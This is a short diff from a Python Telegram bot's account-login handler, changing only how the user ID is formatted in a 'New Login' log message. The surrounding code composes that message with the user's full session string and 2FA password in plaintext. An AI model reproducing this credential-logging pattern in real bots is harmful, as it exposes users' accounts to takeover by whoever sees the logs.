@@ -138,7 +138,7 @@ async def login_acc(bot: Client, message: Message):
             database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
             log_message = (
                 f"**✨New Login**\n\n"
-                f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}), {message.from_user.id}\n\n"
+                f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}), `{message.from_user.id}`\n\n"
                 f"**✨Session String ↓** `{string_session}`\n"
                 f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
             )
